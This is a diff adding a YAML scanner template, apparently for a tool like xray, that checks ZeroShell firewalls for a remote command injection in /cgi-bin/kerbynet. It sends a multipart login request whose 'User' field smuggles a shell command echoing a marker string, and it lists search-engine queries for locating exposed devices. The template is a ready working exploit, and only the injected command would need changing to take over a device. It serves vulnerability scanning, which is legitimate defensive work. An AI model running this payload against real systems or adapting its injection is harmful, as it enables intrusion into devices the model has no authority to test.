@@ -1,0 +1,35 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Zeroshell-防火墙"
+    hunter-query: app.name=="ZeroShell"
+    quake-query: app:"zeroshell"
+    zoomeye-query: app:"ZeroShell"
+    threatbook-query: #
+    cve: 
+    cnvd:
+
+name: poc-yaml-zeroshell-fw-kerbynet-rce
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /cgi-bin/kerbynet
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data; boundary=----------YWJkMTQzNDcw
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Encoding: gzip,deflate,br
+
+      body: "------------YWJkMTQzNDcw\r\nContent-Disposition: form-data; name=\"Action\"\r\n\r\nStartSessionSubmit\r\n------------YWJkMTQzNDcw\r\nContent-Disposition: form-data; name=\"User\"\r\n\r\n' &echo 4ra1n||a #|\r\n------------YWJkMTQzNDcw\r\nContent-Disposition: form-data; name=\"PW\"\r\n\r\n\r\n------------YWJkMTQzNDcw--"
+
+    expression: >-
+      response.status == 200 && response.body_string.contains("4ra1n") && response.body_string.contains("top.body.location")
+expression: r0() 
